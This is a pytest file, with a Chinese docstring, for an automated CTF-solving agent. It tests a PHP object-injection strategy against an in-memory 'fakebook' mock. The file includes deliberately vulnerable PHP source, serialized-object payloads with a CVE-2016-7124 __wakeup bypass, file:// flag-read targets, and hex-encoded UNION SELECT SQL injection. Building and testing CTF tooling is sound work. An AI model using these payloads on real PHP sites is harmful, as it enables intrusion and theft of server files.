"""PHP object-injection → SSRF/file-read gadget：fakebook 型 ceiling 的确定性守护。

框架能力扩面（对标 fakebook-class ceiling）：泄漏源码里某 class 的可控属性被喂进
``file_get_contents``/``curl_exec`` 等文件读取/SSRF sink；已有的 php_unserialize
链只会构造 username/password 认证绕过对象并经独立 GET 参数投递，够不着"属性→
file:// 读取"这种 gadget，也不会走 UNION 列投递。本测试用一个内存 fakebook 后端
（真实序列化对象解析 + numeric UNION 注入 + file:// blog sink）证明新增策略
``php_object_injection_ssrf``：

  ① 纯 payload 合成器 ``_build_php_object_injection_ssrf_payloads`` 产出合法
     ``O:N:"Class":M:{...}``（含 CVE-2016-7124 count+1 的 __wakeup 绕过变体、
     private 属性 null 字节 mangling、sink 属性指向 file:// 目标），
  ② 纯识别器 ``_recognize_php_object_injection_ssrf`` 从泄漏源码解析出
     class/属性/sink 属性/UNION 注入参数，
  ③ 执行器把序列化对象 hex 编码塞进可注入参数的 UNION-SELECT 列（扫小列数×位置），
     令后端 unserialize 后 sink 读取 flag.php，运行时回显 flag → 经 verifier 确认，
  ④ 对没有 file-read/SSRF sink 的源码不误报（识别器返回 None）。

gadget 仅打本进程内存后端，绝不外连。reachability 由
test_chain_reachability_invariant 守护；零回归由全量 unit 套件保证。
"""

from __future__ import annotations

import re
from types import SimpleNamespace
from urllib.parse import parse_qs, urlparse

import pytest

import flaghunter.tools.notes as notes_module
from flaghunter.agents.pa_agent.ctf_dispatcher import CTFTaskDispatcher
from flaghunter.agents.pa_agent.ctf_state import CTFState
from flaghunter.agents.pa_agent.exploit_replay_memory import (
    _build_php_object_injection_ssrf_payloads,
    _recognize_php_object_injection_ssrf,
)
from flaghunter.agents.pa_agent.strategy_registry import StrategyContext, StrategyRegistry
from flaghunter.tools.notes import set_notes_file

_FLAG = "flag{f4keb00k_0bj3ct_1nj_ssrf}"
_COLUMN_COUNT = 4  # users table: no, username, age, data

# Leaked source (class.php.bak): a fakebook-shaped object-injection → SSRF gadget.
# The public property `blog` is passed to file_get_contents; the `data` column is
# unserialized straight from a `where no = $_GET['no']` query → UNION-injectable.
_SOURCE = """<?php
class UserInfo {
    public $name = "";
    public $age = 0;
    public $blog = "";
    function __construct($name, $age, $blog) {
        $this->name = $name;
        $this->age = $age;
        $this->blog = $blog;
    }
    function get($url) {
        return $this->getBlogContents($url);
    }
    public function getBlogContents($blog) {
        return file_get_contents($blog);
    }
}
$db = new mysqli("localhost", "root", "", "fakebook");
$no = $_GET['no'];
$result = $db->query('select * from users where no = ' . $no);
$row = $result->fetch_assoc();
$user = unserialize($row['data']);
echo $user->get($user->blog);
"""

_PAGE_DEFAULT = "<html><body>fakebook profile viewer</body></html>"
_PAGE_SQL_ERROR = "<html><body>Warning: mysqli query column count mismatch</body></html>"


# ---------------------------------------------------------------------------
# In-memory fakebook backend: numeric UNION injection + serialized-object sink
# ---------------------------------------------------------------------------
class _FakebookRuntime:
    """A fakebook-shaped target: `view.php?no=` numeric SQLi UNION-injectable.

    A benign lookup returns the profile page. An attacker who controls the `no`
    param can UNION-SELECT a serialized ``UserInfo`` into the ``data`` column;
    the app ``unserialize``s it and reads ``$user->blog`` via
    ``file_get_contents``. When ``blog`` is a ``file://…/flag.php`` URL the sink
    returns the flag. The UNION must match the 4-column table width, so the
    executor's column-count sweep must land on 4.
    """

    def __init__(self, has_sink: bool = True):
        self.has_sink = has_sink
        self.environment = SimpleNamespace(available_tools=[])
        self.requests: list[str] = []

    def _render(self, no_value: str) -> str:
        # Normalize the WAF-lean `/**/` separators back to spaces for parsing.
        norm = re.sub(r"\s+", " ", no_value.replace("/**/", " ")).strip()
        low = norm.lower()
        if "union" not in low or "select" not in low:
            return _PAGE_DEFAULT
        match = re.search(r"union\s+select\s+(.*)$", norm, re.IGNORECASE)
        if not match:
            return _PAGE_DEFAULT
        columns = [col.strip() for col in match.group(1).split(",")]
        if len(columns) != _COLUMN_COUNT:
            return _PAGE_SQL_ERROR
        for col in columns:
            hex_match = re.fullmatch(r"0x([0-9a-fA-F]+)", col)
            if not hex_match:
                continue
            try:
                decoded = bytes.fromhex(hex_match.group(1)).decode("latin-1")
            except ValueError:
                continue
            blog_match = re.search(r's:4:"blog";s:\d+:"([^"]*)"', decoded)
            if not blog_match:
                continue
            blog = blog_match.group(1)
            if blog.startswith("file://") and blog.endswith("flag.php"):
                return f"<html><body>blog contents: {_FLAG}</body></html>"
        return _PAGE_DEFAULT

    async def browser_action(self, action: str, **kwargs):
        if action == "navigate":
            return {"url": "http://ctf.local/view.php", "title": "fakebook"}
        if action == "get_content":
            return {"content": "fakebook profile viewer", "html": _PAGE_DEFAULT}
        if action == "get_forms":
            return {"forms": []}
        if action == "get_cookies":
            return {"cookie_string": ""}
        return {"error": f"unexpected action: {action}"}

    async def proxy_action(self, action: str, **kwargs):
        url = str(kwargs.get("url") or "")
        self.requests.append(url)
        params = parse_qs(urlparse(url).query, keep_blank_values=True)
        no_value = (params.get("no") or [""])[0]
        return {"status_code": 200, "body": self._render(no_value)}

    async def execute_command(self, command: str, timeout: int = 180):
        return SimpleNamespace(exit_code=0, stdout="", stderr="")


def _reset_notes(tmp_path, name: str) -> None:
    set_notes_file(tmp_path / name)
    notes_module._notes.clear()


def _cleanup_notes() -> None:
    notes_module._notes.clear()
    notes_module._custom_notes_file = None
    notes_module._loaded_notes_file = None


def _make_dispatcher(monkeypatch, runtime) -> CTFTaskDispatcher:
    monkeypatch.setattr(
        "flaghunter.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )
    return CTFTaskDispatcher(
        runtime=runtime,
        progress_callback=None,
        verification_callback=lambda flag: "yes",
    )


_PAGE_FEATURES = {"forms": [], "raw_links": [], "content": "fakebook profile viewer"}


# ---------------------------------------------------------------------------
# Behavioral: end-to-end gadget synthesis → UNION delivery → verified flag
# ---------------------------------------------------------------------------
@pytest.mark.asyncio
async def test_php_object_injection_ssrf_recovers_flag_end_to_end(monkeypatch, tmp_path):
    _reset_notes(tmp_path, "notes_oi_ssrf_vuln.json")
    runtime = _FakebookRuntime(has_sink=True)
    dispatcher = _make_dispatcher(monkeypatch, runtime)
    dispatcher.state = CTFState(target="http://ctf.local/view.php", goal="拿到flag")
    dispatcher.state.add_observation(
        "local_challenge_source_hint",
        _SOURCE,
        metadata={"path": "/tmp/fakebook/class.php.bak", "file_name": "class.php.bak"},
    )

    outcome = await dispatcher._execute_web_chain(
        "http://ctf.local/view.php", _PAGE_FEATURES, ""
    )

    assert outcome.flag == _FLAG
    # A serialized UserInfo object rode a UNION-SELECT column (hex-encoded).
    assert any("union" in url.lower() for url in runtime.requests)
    # The verified exploit is recorded as a vulnerability note.
    assert any(
        "ctf_php_object_injection_ssrf_exploit" in line for line in dispatcher._notes_log
    ), "expected the confirmed object-injection SSRF exploit to be recorded"
    _cleanup_notes()


# ---------------------------------------------------------------------------
# Unit: pure serialized-object builder (declared count + __wakeup bypass)
# ---------------------------------------------------------------------------
def test_build_payloads_emits_faithful_and_wakeup_bypass_objects():
    props = [
        {"name": "name", "visibility": "public"},
        {"name": "age", "visibility": "public"},
        {"name": "blog", "visibility": "public"},
    ]
    payloads = _build_php_object_injection_ssrf_payloads(
        "UserInfo", props, "blog", ["file:///var/www/html/flag.php"]
    )
    # faithful count (3) + CVE-2016-7124 __wakeup bypass (count+1 == 4)
    assert 'O:8:"UserInfo":3:{' in payloads[0]
    assert any('O:8:"UserInfo":4:{' in p for p in payloads)
    # sink property carries the file:// target with a correct byte length
    target = "file:///var/www/html/flag.php"
    assert f's:4:"blog";s:{len(target)}:"{target}";' in payloads[0]
    # non-sink props are benign empty strings, not the target
    assert 's:4:"name";s:0:"";' in payloads[0]


def test_build_payloads_mangles_private_property_keys():
    props = [{"name": "cmd", "visibility": "private"}]
    payloads = _build_php_object_injection_ssrf_payloads(
        "Evil", props, "cmd", ["file:///flag"]
    )
    # private key mangles to \x00Class\x00name (byte-length counted)
    mangled_key = "\x00Evil\x00cmd"
    assert f's:{len(mangled_key)}:"{mangled_key}";' in payloads[0]


def test_build_payloads_requires_class_and_sink():
    assert _build_php_object_injection_ssrf_payloads("", [], "blog", ["file:///flag"]) == []
    assert _build_php_object_injection_ssrf_payloads("X", [], "", ["file:///flag"]) == []


# ---------------------------------------------------------------------------
# Unit: source recognizer parses the gadget shape, rejects non-sinks
# ---------------------------------------------------------------------------
def test_recognizer_extracts_class_sink_prop_and_union_param():
    recognized = _recognize_php_object_injection_ssrf(_SOURCE)
    assert recognized is not None
    assert recognized["class_name"] == "UserInfo"
    assert recognized["sink_prop"] == "blog"
    assert recognized["union_param"] == "no"
    prop_names = [p["name"] for p in recognized["props"]]
    assert prop_names == ["name", "age", "blog"]


def test_recognizer_returns_none_without_file_read_sink():
    benign = """<?php
    class Session {
        public $user = "";
        public $role = "guest";
    }
    $data = unserialize($_COOKIE['session']);
    echo $data->user;
    """
    assert _recognize_php_object_injection_ssrf(benign) is None


def test_recognizer_returns_none_without_unserialize():
    no_deser = """<?php
    class Reader { public $path = ""; }
    echo file_get_contents($_GET['path']);
    """
    assert _recognize_php_object_injection_ssrf(no_deser) is None


# ---------------------------------------------------------------------------
# Unit: strategy is registered, reachable in the web order, extras-gated
# ---------------------------------------------------------------------------
def test_php_oi_ssrf_strategy_registered_and_extras_gated():
    from flaghunter.agents.pa_agent.chains.web import WEB_STRATEGY_ORDER

    assert "php_object_injection_ssrf" in WEB_STRATEGY_ORDER
    strategy = StrategyRegistry.build_default().get("php_object_injection_ssrf")
    assert strategy is not None
    assert strategy.chain_name == "web"

    gated_on = StrategyContext(
        target="http://ctf.local/view.php",
        page_features={},
        hint="",
        services=None,
        extras={"php_oi_ssrf_exploit_info": {"payloads": ["x"], "union_param": "no"}},
    )
    gated_off = StrategyContext(
        target="http://ctf.local/view.php",
        page_features={},
        hint="",
        services=None,
    )
    assert strategy.is_applicable(gated_on) is True
    assert strategy.is_applicable(gated_off) is False
